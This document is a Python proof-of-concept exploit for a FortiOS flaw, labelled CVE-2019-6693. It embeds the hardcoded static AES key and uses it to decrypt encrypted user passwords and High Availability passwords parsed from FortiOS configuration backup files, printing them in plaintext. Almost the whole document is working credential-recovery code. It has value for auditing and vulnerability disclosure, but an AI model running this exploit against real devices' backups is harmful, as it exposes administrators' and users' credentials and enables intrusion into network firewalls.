import base64
from Cryptodome.Cipher import AES

banner = """

   _______      ________    ___   ___  __  ___           __    __ ___ ____  
  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \         / /   / // _ \___ \ 
 | |     \ \  / /| |__ ______ ) | | | || | (_) |______ / /_  / /| (_) |__) |
 | |      \ \/ / |  __|______/ /| | | || |\__, |______| '_ \| '_ \__, |__ < 
 | |____   \  /  | |____    / /_| |_| || |  / /       | (_) | (_) |/ /___) |
  \_____|   \/   |______|  |____|\___/ |_| /_/         \___/ \___//_/|____/ 

---                                                                            
🔑 An authorized remote user with access or knowledge of the standard encryption key 
could gain access and decrypt the FortiOS backup files and all non-administor passwords, 
private keys and High Availability passwords.
---                                            

"""
print(banner)
def decrypt_password(encrypted_password):
    key = b'Mary had a littl'
    try:
        data = base64.b64decode(encrypted_password)
        iv = data[0:4] + b'\x00' * 12
        ct = data[4:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        pt = cipher.decrypt(ct)
        return pt.decode(errors='ignore').rstrip('\x00')
    except Exception:
        return str(pt).rstrip('\x00').lstrip("b'").rstrip("'")

def parse_user_data(data):
    users = []
    lines = data.split('\n')
    user = None

    for line in lines:
        line = line.strip()
        if line.startswith('edit "'):
            if user:
                users.append(user)
            user = {'User': line.split('"')[1]}
        elif 'set passwd ENC' in line:
            if user is not None:
                user['Password'] = line.split(' ')[-1]

    if user:
        users.append(user)

    return users

def parse_ha_data(data):
    ha_config = {}
    lines = data.split('\n')
    in_ha_config = False

    for line in lines:
        line = line.strip()
        if line.startswith('config system ha'):
            in_ha_config = True
        elif in_ha_config and 'set group-name' in line:
            ha_config['Group Name'] = line.split('"')[1]
        elif in_ha_config and 'set password ENC' in line:
            ha_config['Encrypted Password'] = line.split(' ')[-1]
        elif line == 'end' and in_ha_config:
            break

    return ha_config

with open('data.txt', 'r') as file:
    user_data = file.read()

with open('ha_config.txt', 'r') as file:
    ha_data = file.read()

print("---\nUSERS\n---\n")
users = parse_user_data(user_data)
for user in users:
    decrypted_password = decrypt_password(user['Password'])
    print(f"User: {user['User']}\nPassword: {user['Password']}\nDecrypted: {decrypted_password}\n")

print("\n---\nHIGH AVAILABILITY (HA)\n---\n")
ha_config = parse_ha_data(ha_data)
if ha_config:
    decrypted_password = decrypt_password(ha_config['Encrypted Password'])
    print(f"\nHA Group Name: {ha_config['Group Name']}")
    print(f"Encrypted: {ha_config['Encrypted Password']}")
    print(f"Decrypted: {decrypted_password}\n")